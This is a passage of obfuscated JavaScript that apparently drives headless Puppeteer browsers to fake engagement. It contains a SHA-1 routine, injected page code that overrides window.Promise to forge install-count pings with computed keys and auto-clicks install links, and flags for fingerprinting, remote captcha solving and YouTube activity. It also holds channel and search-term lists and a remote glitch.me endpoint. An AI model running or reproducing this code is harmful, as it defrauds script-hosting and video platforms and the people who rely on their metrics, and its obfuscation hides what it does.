              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1eed + -0xeb1 * -0x1 + -0x1 * -0x103d;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x14c2 + -0x8e * 0x21 + 0x2720] = this['block'], J[K >> -0x640 + -0x2709 + 0x2d4b] |= x[-0x29 * -0xd1 + 0x6a8 + -0x140f * 0x2 & K], this['block'] = J[-0x1089 * 0x1 + -0x12e5 + 0x237e], K >= -0x1f1 * -0x1 + 0x13ee * -0x1 + 0x1235 && (this['hashed'] || this['hash'](), J[0x270f + -0x2 * 0x761 + 0x184d * -0x1] = this['block'], J[0xcd0 + -0x59e + -0x722] = J[0x2 * 0x9ac + 0x1301 + -0x2658 * 0x1] = J[-0xf5a + -0x7dc + 0x1738] = J[0x191f + 0x1b66 + 0x2f * -0x11e] = J[0x3 * 0xb9a + -0x2193 + -0x137] = J[0x1ced + 0xf * -0x1ef + 0x1 * 0x19] = J[0x148f * 0x1 + -0x1 * 0x1ed9 + 0x14a * 0x8] = J[-0x707 + 0x2 * 0x88d + -0xa0c] = J[0xa * 0x259 + 0x2128 + -0xe * 0x40b] = J[-0x1dee + 0xe37 + 0xfc * 0x10] = J[0x1 * -0xc56 + 0x3 * 0x248 + -0x3b * -0x18] = J[-0xa7 * -0x19 + 0x68e + 0x2 * -0xb69] = J[-0x1bc4 + -0x236 * 0x1 + -0x3f * -0x7a] = J[-0x1e * -0xf + -0x3 * 0xcf9 + 0x16 * 0x1b1] = J[-0x122d * -0x1 + 0x1 * 0x266b + -0x388a] = J[0x263f * 0x1 + -0x2 * -0x568 + 0x1c0 * -0x1c] = 0x500 + -0x1099 * 0x1 + 0x1 * 0xb99), J[0x1 * -0xd36 + -0x7c3 + 0x7 * 0x301] = this['hBytes'] << 0xcf5 + -0x2e6 + -0xa0c | this['bytes'] >>> -0x166f * 0x1 + -0x1 * -0x633 + -0xf * -0x117, J[0x1 * 0x1526 + 0xcf3 + 0x1 * -0x220a] = this['bytes'] << -0x3e * 0x75 + 0x1ba + -0xeb * -0x1d, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x90c * 0x4 + -0x5fb + -0x1e25; J < 0xa83 + -0x1 * -0x9e6 + -0x1419; ++J)
                K = Q[J - (-0xe * -0x2a5 + 0x2f * -0xbf + -0x1f2)] ^ Q[J - (-0x2172 + 0x843 + 0x1937)] ^ Q[J - (-0x1a9d + 0x1 * 0x2562 + -0xab7)] ^ Q[J - (0x1f4 * 0x5 + 0x8 * 0x1c3 + -0x17cc)], Q[J] = K << 0xa * -0x50 + -0xfa5 * -0x2 + -0x1c29 | K >>> -0x17e3 + 0x2 * 0xc9b + -0x2 * 0x9a;
              for (J = -0x1eb + -0x19dc + 0x1bc7; J < -0x1 * -0x1cbd + 0x249e + -0x4147; J += -0x9 * -0x23c + -0x11 * 0x83 + -0xb64)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x19e0 + 0x20b * 0x1 + -0x1be6 | L >>> -0x10 * 0x130 + -0x410 + 0x172b) + (M & N | ~M & O) + P + (0x9b8d4355 + -0x70d22 * 0x411 + -0x245e627a) + Q[J] << -0x1817 + -0x1 * -0x12b6 + 0x561) << 0x24d8 + -0x12f0 + 0xf1 * -0x13 | P >>> -0x3d3 * 0x1 + -0x55e + -0x1dc * -0x5) + (L & (M = M << -0x16ae + 0x2d * -0x92 + 0x183b * 0x2 | M >>> -0x8b * -0x8 + -0x2507 + 0x20b1) | ~L & N) + O + (0x3a105d08 + 0x681f4a40 + -0x47ad2daf) + Q[J + (-0xd2d + 0x366 * -0xb + -0xca4 * -0x4)] << 0x89 * 0xd + 0x19ea + -0xb * 0x2fd) << 0xcfc + 0x485 + -0x2ea * 0x6 | O >>> 0x5cf * -0x1 + -0xb * -0x173 + 0x1 * -0xa07) + (P & (L = L << -0x1e78 + 0x3b * 0x6b + -0x29 * -0x25 | L >>> 0xeb1 * -0x1 + -0x2191 + 0x3044) | ~P & M) + N + (-0x5066a0fe + 0x25 * -0x380d424 + -0x11 * -0x11ada21b) + Q[J + (-0x561 + -0xf6c + 0x14cf)] << -0x3f2 + 0x2208 + -0x1e16 * 0x1) << -0x44 * 0xa + -0xb8c + 0xe39 | N >>> 0xb2d + -0x1c8b * -0x1 + -0x279d) + (O & (P = P << 0x144c + 0x172 * -0x14 + 0x8ba | P >>> 0x47 * -0x30 + -0x4fb * 0x5 + 0x2639) | ~O & L) + M + (0x89d4b2b7 + 0xad58ceee + -0xdcab080c) + Q[J + (0x1 * -0xd3 + 0x15 * -0xc8 + 0x113e)] << -0x3fb * 0x1 + 0x43c + -0x41) << -0xf9 * 0x11 + 0x17 * 0x67 + 0x74d | M >>> 0x954 + -0x1 * 0x26e2 + 0x1da9) + (N & (O = O << 0xed + -0x1 * 0x1df5 + -0xe93 * -0x2 | O >>> 0x1226 + -0x1332 + -0x2 * -0x87) | ~N & P) + L + (0xc40ec7 * -0x49 + -0x8e2182ba + 0x1208c3312) + Q[J + (-0xa31 + -0xefd + 0x2b * 0x96)] << -0x15 * -0x129 + -0xaed + -0xd70, N = N << 0xcc + -0x1da8 + 0x1cfa | N >>> -0x4f * 0x6d + -0x6 * -0x2ef + 0x6f * 0x25;
              for (; J < 0x941 + -0x1e52 + 0x1539; J += 0x3 * 0xcbb + -0x1117 + -0x1515)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x1253 + -0x372 + -0x1 * -0x15ca | L >>> -0x1 * -0x592 + 0x80d + -0xd84) + (M ^ N ^ O) + P + (-0x5031623d + 0x2 * 0xe8f4565 + -0x3fd * -0x2899a4) + Q[J] << 0x14e0 + 0xb80 + -0x2060) << 0x98b + 0x1 * -0x229f + -0x505 * -0x5 | P >>> -0x12c + -0x4d4 * -0x5 + 0x79f * -0x3) + (L ^ (M = M << 0x3 * -0x626 + 0x1 * 0x1f1b + 0xa9 * -0x13 | M >>> 0xa34 * 0x1 + -0x710 * -0x3 + -0x1f62) ^ N) + O + (-0x32eb9aa2 * -0x2 + -0x49d * -0x347fe + 0x1 * -0x6206869) + Q[J + (0x1f3 * 0x1 + 0x1b2f + 0x1 * -0x1d21)] << 0x14 * -0xd4 + -0xcd7 + 0x3 * 0x9cd) << 0xb * -0x36a + -0xd62 + 0x32f5 | O >>> 0x63 * -0x3b + -0x267d + 0x3d69) + (P ^ (L = L << 0x488 + -0xb * 0x140 + 0xef * 0xa | L >>> 0x2f7 + 0x2 * -0xa2 + 0x1 * -0x1b1) ^ M) + N + (-0xace43143 + -0x4f6c3009 + -0x3d * -0x5f41a71) + Q[J + (-0x17e * 0x17 + 0x52a + 0x1d2a)] << 0x732 * -0x3 + -0x1dbd + -0x7 * -0x755) << 0x23 * -0x3c + -0x574 * -0x4 + -0xd97 | N >>> -0x537 * -0x3 + 0xb5 * -0x3 + -0xd6b) + (O ^ (P = P << -0x1516 * 0x1 + -0x1a * 0xab + 0x2692 | P >>> 0x8f3 + -0x1df4 + 0x1503) ^ L) + M + (-0x19993 * -0x80bf + 0xc94585c1 + -0x12866aecd) + Q[J + (-0x1c44 + 0x17 * -0x2b + -0xb * -0x2ec)] << 0xc7a * -0x1 + -0x11bf + 0x3 * 0xa13) << -0x224b + -0x1d8c + -0x4 * -0xff7 | M >>> 0x2 * 0x1d + -0x1 * -0xa9b + -0xaba * 0x1) + (N ^ (O = O << 0x1 * 0xa61 + -0x1560 + 0xb1d | O >>> 0x16a9 + -0x1267 + 0x220 * -0x2) ^ P) + L + (-0x1 * -0x3b848539 + -0x60d89ae9 + 0x942e0151) + Q[J + (0x1 * -0x1915 + 0x33 * 0x6b + 0x16 * 0x2c)] << 0xd40 + 0x22e3 + -0x3023, N = N << -0x9 * -0x2d + -0x2 * -0xc43 + -0x19fd | N >>> -0xabd + -0x192 * -0x12 + -0x1185;
              for (; J < 0x1 * 0x687 + -0x7 * 0x7f + -0x2d2; J += -0x1aee + 0x2 * 0x239 + 0x1681)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x5 * -0x5ea + -0x904 + -0x1 * -0x269b | L >>> -0x1fe + 0x1 * -0x244d + 0x2666) + (M & N | M & O | N & O) + P - (-0x2ac2d453 + -0xd274bbf * 0xf + 0x346936 * 0x6bc) + Q[J] << -0x845 + 0x1 * 0x1cdb + -0xa4b * 0x2) << -0x4 * -0x44 + -0x1177 * -0x1 + 0xce * -0x17 | P >>> 0x1180 + -0x12ae * 0x1 + -0x149 * -0x1) + (L & (M = M << -0x1 * 0x1607 + -0xe70 + 0x2495 | M >>> 0x6d * -0x11 + -0x1d7 * 0xf + 0x22d8) | L & N | M & N) + O - (-0x56a609c2 + 0x25f0a989 * -0x5 + 0x39 * 0x6d42b2b) + Q[J + (-0x12f3 + 0x1 * 0x131e + -0x2a * 0x1)] << 0x261e + 0x3 * -0x4cc + -0x17ba) << -0x19 * 0x15d + -0x12f + 0x2349 | O >>> 0x1105 + -0x1e5 * -0x4 + -0xa * 0x273) + (P & (L = L << -0x14fe + -0xe * 0x1f5 + 0x1841 * 0x2 | L >>> 0x23a6 + 0x1 * -0x1e64 + -0x540) | P & M | L & M) + N - (-0x70d4781b + 0x9f456ad6 + -0x3ca8f * -0x1187) + Q[J + (-0x1b9d + -0x1 * -0xacf + 0x10d0)] << 0x2fd + 0xc53 * -0x1 + 0x956 * 0x1) << -0x1b7c + -0xe97 + 0x8 * 0x543 | N >>> -0xb2 + 0x715 * 0x2 + -0xd5d) + (O & (P = P << 0x15b0 + 0x19d7 + -0x35 * 0xe5 | P >>> -0xc17 + 0x193b + -0xd22) | O & L | P & L) + M - (-0x1 * 0x84934b1 + -0x1 * -0x56ec52f9 + 0xa * 0x36cea16) + Q[J + (0x20ef * 0x1 + -0x17 * 0x1a3 + 0x4b9)] << -0xb1e * -0x2 + -0x154d + -0xef) << 0x13 * -0x1ec + 0x1 * 0x959 + 0x1b30 | M >>> 0x3 * -0xb3f + 0x144c * -0x1 + -0x7 * -0x7bc) + (N & (O = O << -0x1773 + 0xe * 0x265 + 0x1 * -0x9f5 | O >>> 0xd * -0x1df + -0x4 * 0x494 + 0x2aa5) | N & P | O & P) + L - (-0x70d78a31 + 0x14 * -0x27f34a3 + -0xbfc5817 * -0x17) + Q[J + (0x2471 * 0x1 + 0x26e6 + 0x4b53 * -0x1)] << 0x869 + -0x11 * -0xc2 + -0x17 * 0xed, N = N << 0x1b93 + 0x9ab * -0x2 + 0xe7 * -0x9 | N >>> 0x1cd2 * -0x1 + -0x13af + -0x469 * -0xb;
              for (; J < -0xe45 + -0x247 * 0x3 + 0x1 * 0x156a; J += -0x2 * -0x923 + 0x1970 + -0x2bb1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4cc + 0x660 + -0xb27 | L >>> 0x18f + -0x23ec + -0x8 * -0x44f) + (M ^ N ^ O) + P - (-0x310098bb * 0x1 + 0x516a0b8f + 0x1533cb56) + Q[J] << 0xbf8 + -0xbcf + -0x29) << -0x11c7 + -0x22bc + 0x3488 | P >>> 0x683 + -0x11 * -0x11e + -0x1966) + (L ^ (M = M << 0x2ec + 0x1983 + -0x1c51 | M >>> -0x15b8 + -0x81 * 0x8 + -0x3 * -0x896) ^ N) + O - (0x62e50d21 * -0x1 + -0x1572db * -0x53 + -0x25d45a * -0x3d9) + Q[J + (-0x325 + -0x1d05 + 0x202b)] << 0x19c1 + -0x6 * -0x41 + 0x1b47 * -0x1) << 0x2b * -0x76 + -0x1695 + 0x2a6c | O >>> 0x3e3 + -0x2b * 0xc9 + -0x5 * -0x5ff) + (P ^ (L = L << 0x243e + -0x2 * -0x3e5 + -0x2 * 0x15f5 | L >>> -0x18d + 0x166 * 0x7 + -0x83b) ^ M) + N - (-0x3ddcc * -0x56 + -0x2299d6d8 + 0x211c689 * 0x2a) + Q[J + (-0x1e37 + 0x1b * -0x4 + 0x1ea5)] << -0x6c3 * -0x1 + -0xa9b + -0xa4 * -0x6) << -0x357 + 0x1009 * 0x1 + 0x1 * -0xcad | N >>> -0x65f + -0x3 * 0x5cb + 0x17db) + (O ^ (P = P << 0x2bd * -0x1 + 0x162f + -0x1354 | P >>> 0x1 * -0x3fd + 0x1e86 + -0x1a87) ^ L) + M - (0x46c78f33 + -0x1ec7cae7 + -0x2 * -0x6cebcef) + Q[J + (0x209d + 0x88 * 0x17 + -0x1669 * 0x2)] << 0x199 * -0x12 + -0xac1 * -0x3 + 0x1 * -0x381) << -0x19 * -0x17b + 0x487 + -0x2985 | M >>> -0x9e * 0x35 + -0x35 * 0x2b + -0x216 * -0x14) + (N ^ (O = O << 0x80 * -0x28 + 0xfd5 + 0x1 * 0x449 | O >>> -0x2269 + -0x1 * 0x517 + 0x185 * 0x1a) ^ P) + L - (0x13 * 0xd42537 + 0x7b0c73 * 0x75 + -0x125e357a * 0x1) + Q[J + (-0x1dca + 0xf25 + -0x1a1 * -0x9)] << -0x149 * -0x9 + 0x157 + -0xec * 0xe, N = N << 0x1 * 0x177e + -0x883 + -0xedd | N >>> -0x17 * -0x193 + 0x3ab * 0x8 + 0x1 * -0x418b;
              this['h0'] = this['h0'] + L << -0x2 * 0x40d + 0x208a + -0x1870, this['h1'] = this['h1'] + M << -0x1e5 * 0xf + 0xe1 * 0x19 + -0xb * -0x96, this['h2'] = this['h2'] + N << -0xc59 * 0x3 + -0x17b3 + -0x32 * -0x137, this['h3'] = this['h3'] + O << -0x1 * 0x19cb + -0x234f + 0xb * 0x58e, this['h4'] = this['h4'] + P << 0x309 + 0xe3b + -0x1144;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x6eb + -0x241 * 0xd + 0x167e & 0x472 * 0x3 + 0x5 * 0x2c5 + -0x1b20] + w[J >> -0x937 * 0x2 + -0xafa * 0x2 + 0x3 * 0xd7e & 0x436 * -0x8 + 0x2551 + -0x392] + w[J >> -0xa60 + 0x656 * 0x3 + 0x2 * -0x447 & -0x1573 + -0xf3 + 0x1675 * 0x1] + w[J >> -0xaca + 0x198d + -0xeb3 & 0xc47 + 0x79 * 0x47 + -0x2dc7 * 0x1] + w[J >> 0x1 * 0x24ee + -0x8b * -0x47 + -0x4b6f & -0x1594 + -0x155 * -0x1 + -0x71 * -0x2e] + w[J >> -0x18b5 + -0xb * -0x1a3 + 0x6bc & 0x1b7 + 0x1 * 0x1fb3 + -0x215b * 0x1] + w[J >> -0xa2 * 0x37 + 0x228f + 0x43 & 0x1412 + -0x1892 + 0x48f] + w[-0x73 * -0x1d + -0x279 + 0x1 * -0xa7f & J] + w[K >> 0x2373 + -0x72 * 0x11 + -0x1bc5 & -0x88 * 0x1b + 0x1f10 + 0x5 * -0x355] + w[K >> -0x1ac5 * -0x1 + -0x7e1 * -0x2 + -0xd5 * 0x33 & 0xf8c + -0x11a7 * 0x1 + 0x2 * 0x115] + w[K >> 0x178a + 0x1260 + -0x5a * 0x77 & -0x1 * -0x1783 + 0x1160 + -0x28d4] + w[K >> -0x1 * 0xc22 + -0x1 * -0x1324 + -0x379 * 0x2 & 0xb48 * -0x1 + 0x156b + -0xa14] + w[K >> -0x21b3 * -0x1 + 0x4e2 + 0x7b5 * -0x5 & -0x1684 + -0x1 * 0x1a51 + 0xc * 0x413] + w[K >> 0x113e + -0x1 * 0x517 + -0xc1f & -0x1bac + -0x1 * -0x16db + 0x4e0] + w[K >> -0x24de + 0x566 * 0x1 + 0x193 * 0x14 & 0x7 * -0x511 + -0x1 * 0x74b + 0x61 * 0x71] + w[0x18f0 + -0x15ee + -0x2f3 & K] + w[L >> -0x249f + -0x2341 + -0x2 * -0x23fe & 0x1cc0 + -0x25c3 + 0x912] + w[L >> 0x110a + -0x17d1 + -0x6df * -0x1 & 0x45b * -0x6 + 0x13ae + 0x1 * 0x683] + w[L >> 0xdd2 + -0x3f * 0x3f + 0x1c3 & -0x1 * 0x1b7d + -0x269c + 0x4228] + w[L >> 0x7 * -0x2c5 + 0x1cb + -0x2 * -0x8d4 & -0x4 * -0x6a1 + 0xf71 * -0x1 + -0xb04] + w[L >> 0x2329 + 0x24a0 + -0x47bd & 0x275 * -0x2 + -0x191 + -0x1b * -0x3e] + w[L >> -0x20c3 + 0x25 * 0x67 + 0x11e8 & 0x4ee + -0x200c + 0x1b2d] + w[L >> -0x9de + -0x1225 + -0x1c07 * -0x1 & 0x1a7d + 0x4 * 0x10c + -0x1 * 0x1e9e] + w[-0x209e + -0x1 * -0xdff + 0x12ae & L] + w[M >> 0x1819 + -0x1 * -0x164 + -0x1961 & -0x1c91 * -0x1 + 0x1665 + -0x32e7] + w[M >> -0x143a + -0x8c4 * 0x4 + -0x93b * -0x6 & 0x18c4 + 0x1a82 + -0x3337] + w[M >> -0x17 * -0xb3 + 0x243b + -0x343c & 0x51 + 0x177a + 0x1c * -0xd9] + w[M >> -0x3 * 0xa1d + 0x101 * -0xd + -0x73e * -0x6 & -0x7d * 0x3 + 0x1076 * -0x1 + 0x47f * 0x4] + w[M >> -0x64 + 0x3c3 + -0x353 & -0x5ea * 0x4 + -0x1 * 0x1cf9 + 0x34b0] + w[M >> -0x1c57 + -0x2145 + 0x3da4 & 0x12c3 * -0x2 + -0x2288 + 0x481d] + w[M >> 0x2273 + 0x22c * -0x6 + -0x1567 & 0x985 * -0x4 + -0xa9a + 0x30bd] + w[-0x1a7 * -0xe + 0x1a0c + -0x311f & M] + w[N >> 0xc5c + 0x17d * 0x4 + -0x14 * 0xe9 & -0xd38 + -0xb44 + 0x188b] + w[N >> -0x1d68 * 0x1 + 0xc * -0x13e + 0x2c68 & -0x13e1 + -0x1f27 + -0x3317 * -0x1] + w[N >> -0x17 * 0x1 + -0x23f9 + 0x303 * 0xc & -0x4a0 + -0xa61 + 0xf10] + w[N >> -0x3 * -0xce7 + -0x7f1 + 0x3 * -0xa3c & -0x1 * 0x16ab + 0x1 * 0x1593 + -0x5 * -0x3b] + w[N >> -0x358 + 0x24a1 * 0x1 + -0x213d & -0x1 * 0x6a4 + -0xe16 + 0x14c9] + w[N >> 0xbef + 0xd1 + -0xb * 0x128 & 0x31a + -0x3ee + 0xe3] + w[N >> 0x450 + 0x1 * -0xf3b + -0x3 * -0x3a5 & 0x5 * 0x704 + 0x9b0 + -0x2cb5] + w[-0x1543 * -0x1 + 0x832 * -0x1 + -0x2d * 0x4a & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x89c + 0x2ee + 0x24a * -0x5 & -0x2 * -0x53d + -0x1abc + 0x1141,
                J >> -0x8 * 0x470 + 0x11 * 0xf9 + 0x1307 & -0x1c15 + -0x1fca + -0x93 * -0x6a,
                J >> 0x70 * -0x1 + 0x3 * 0x71a + -0x7f * 0x2a & 0x7c * 0x4a + -0x108a + -0x124f,
                -0x92a + 0x5bc + 0x46d & J,
                K >> -0x1291 + -0x1 * 0x699 + 0x1942 & 0xdf3 * 0x2 + -0xa * 0xdf + -0x1231,
                K >> -0x1 * 0x15e5 + -0x21df + 0x37d4 & 0x1cf * 0x7 + -0x24b0 + -0x2 * -0xc83,
                K >> -0x4 * 0x83b + -0x1dd2 + 0x3ec6 & 0x1119 + 0x1243 + 0x1 * -0x225d,
                0x1959 + -0xcc2 * 0x1 + -0xb98 * 0x1 & K,
                L >> -0x16 * -0x101 + 0x607 + 0x3 * -0x957 & -0x1d5 + 0x20e6 + 0x1e12 * -0x1,
                L >> -0x289 * -0xb + -0x5 * 0x3ad + 0x27 * -0x3e & -0xd3 * -0x29 + 0x5 * -0x1af + -0x1861,
                L >> -0x12ad * -0x2 + 0x5f * -0x4b + 0x7 * -0x15b & -0xfab + -0x229f + 0x3349,
                -0x3d * 0x7f + 0xca1 * 0x2 + 0x600 & L,
                M >> -0x54c + 0xfe3 * 0x1 + 0x1 * -0xa7f & 0x1 * -0x2437 + -0x253f + 0x4a75 * 0x1,
                M >> 0x4 * -0x9c2 + 0x1d0d + 0xa0b * 0x1 & -0x12c5 + 0x510 * -0x7 + -0x3734 * -0x1,
                M >> -0x1fa8 + -0x1 * -0x201b + -0x6b & -0x9c9 + -0x17 * 0x10d + 0x22f3,
                -0x862 + 0x39 * 0x83 + -0x22 * 0x95 & M,
                N >> 0x2 * -0xe57 + 0x2431 * -0x1 + 0x40f7 * 0x1 & 0x1887 + -0x67a + -0x110e,
                N >> -0xc43 + -0x2096 + 0x2ce9 & 0x1696 + 0x36e * 0x9 + -0xd * 0x409,
                N >> 0xb * -0xb0 + -0x1 * -0x106d + 0x1 * -0x8d5 & -0x1b01 + 0x1 * 0x1b45 + 0x11 * 0xb,
                -0x18d3 + -0x8 * -0x2cd + 0x36a & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x2645 + 0x1335 * 0x1 + -0x15e * -0xe), (K = new DataView(J))['setUint32'](0x46a + -0x1b41 * -0x1 + -0x1fab, this['h0']), K['setUint32'](-0xa47 * -0x3 + 0x6f3 * 0x5 + -0x4190, this['h1']), K['setUint32'](-0x286 + 0x364 + 0x6b * -0x2, this['h2']), K['setUint32'](0xd63 + -0xfb7 * -0x1 + -0xe87 * 0x2, this['h3']), K['setUint32'](0x3f7 + -0x356 + -0x5 * 0x1d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1413 + 0xb7d + -0x5 * 0x650];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1e37 + 0xc83 * 0x3 + -0x752;
            J[-0x14e * 0xe + 0x1c73 + -0xa2f]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * 0x62b + -0xe1 + 0x70c] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x159c + 0x1 * 0x1452 + -0x29ed * 0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x2400 + 0xa3b * -0x2 + -0x23 * -0x19d;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x7 * 0x535 + -0x2d3 + 0x2d22), Promise['resolve'](-0xb8b * -0x2 + -0xf02 + -0x813);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r[T(0x5)](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1bd0 + 0x15 * 0x29 + 0x1873; j < 0x2430 + -0x65 * -0x1e + 0x13 * -0x287; j++)
    i();
}
const NETWORK_PATIENCE = -0x29 * -0x180 + 0x61 * 0x17 + -0x1 * 0x26f7 + (-0x106 * 0xb + 0x19 * -0x10f + 0x3171) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x8 * -0x11 + -0x7ed * 0x4 + 0x203f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x171e + -0xa8a + 0x21a8 * 0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + U(0x11, '[D$W') + V(0x10) + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 